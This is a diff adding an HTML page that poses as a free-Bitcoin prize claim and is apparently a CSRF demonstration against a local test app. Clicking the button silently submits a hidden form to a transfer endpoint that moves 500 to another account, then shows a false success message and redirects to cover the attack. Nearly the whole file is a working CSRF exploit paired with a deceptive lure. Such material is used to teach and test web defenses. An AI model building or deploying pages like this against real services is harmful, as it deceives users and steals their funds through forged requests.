@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Win Free Bitcoin!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      line-height: 1.6;
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    
+    h1 {
+      color: #e74c3c;
+      text-align: center;
+    }
+    
+    .container {
+      border: 1px solid #ddd;
+      padding: 20px;
+      border-radius: 5px;
+      background-color: #f9f9f9;
+    }
+    
+    .btn {
+      display: block;
+      width: 200px;
+      background-color: #e74c3c;
+      color: white;
+      text-align: center;
+      padding: 10px;
+      margin: 20px auto;
+      border-radius: 5px;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>🎉 Congratulations! You've Been Selected! 🎉</h1>
+  
+  <div class="container">
+    <h2>You're our lucky visitor #1000!</h2>
+    <p>You've been randomly selected to receive <strong>0.1 BTC</strong> absolutely free! All you need to do is click the button below to claim your prize.</p>
+    
+    <p>Our automatic system will deposit the Bitcoin directly to your wallet within 24 hours.</p>
+    
+    <a href="#" class="btn" id="claim-btn">CLAIM YOUR FREE BITCOIN NOW!</a>
+    
+    <p><small>Limited time offer. One claim per person. Terms and conditions apply.</small></p>
+  </div>
+  
+  <!-- Hidden CSRF attack - transfers money when clicked -->
+  <iframe name="csrf-frame" class="hidden"></iframe>
+  
+  <form id="csrf-form" action="http://localhost:3000/api/transfer" method="POST" target="csrf-frame" class="hidden">
+    <input type="hidden" name="to" value="3"> <!-- Attack transfers to Bob (ID 3) -->
+    <input type="hidden" name="amount" value="500"> <!-- Amount to steal -->
+    <input type="hidden" name="note" value="Thanks for the Bitcoin!">
+  </form>
+  
+  <script>
+    document.getElementById('claim-btn').addEventListener('click', function(e) {
+      e.preventDefault();
+      
+      // Submit the hidden CSRF form
+      document.getElementById('csrf-form').submit();
+      
+      // Show success message
+      alert('Congratulations! Your Bitcoin claim has been processed. You will receive your BTC within 24 hours.');
+      
+      // Redirect to legitimate site to hide the attack
+      setTimeout(function() {
+        window.location.href = 'http://localhost:3000?message=Thanks+for+claiming+your+Bitcoin!';
+      }, 1000);
+    });
+  </script>
+</body>
+</html> 
